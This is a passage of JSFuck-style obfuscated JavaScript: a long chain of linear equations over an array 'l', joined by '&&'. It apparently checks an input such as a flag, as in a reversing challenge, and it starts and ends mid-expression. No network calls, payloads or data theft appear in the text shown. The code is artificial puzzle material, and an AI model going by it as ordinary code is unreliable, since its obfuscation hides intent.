[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]+l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+[+!+[]+[!+[]+!+[]]])&amp;&amp;l[+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]])&amp;&amp;l[!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==-+(!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[+!+[]]]-l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]]-l[+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]+l[+[]]+l[!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]==+(+!+[]+[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])&amp;&amp;l[+!+[]+[!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]==-+(+!+[]+[!+[]+!+[]+[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])&amp;&amp;l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[+!+[]]]+l[+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]]]==-+(+!+[]+[+!+[]+[!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[+[]]]+l[+!+[]+[+!+[]]]+l[!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]+l[+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+[]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[+!+[]]]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[+!+[]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]+l[+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+[+[]]])&amp;&amp;l[+!+[]+[+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]-l[+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[+!+[]]]+l[!+[]+!+[]]+l[+[]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+[]]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]-l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[+!+[]]]==-+(!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]+[!+[]+!+[]+!+[]]])&amp;&amp;l[!+[]+!+[]+!+[]+[!+[]+!+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]]-l[+!+[]+[!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]-l[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]]+l[!+[]+!+[]+!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]+l[+!+[]]+l[!+[]+!+[]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]]]+l[!+[]+!+[]+[!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]-l[!+[]+!+[]+!+[]+!+[]+[+!+[]]]-l[+[]]-l[!+[]+!+[]+!+[]+[+!+[]]]-l[!+[]+!+[]+[+[]]]+l[+!+[]+[!+[]+!+[]]]-l[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+l[!+[]+!+[]+[!+[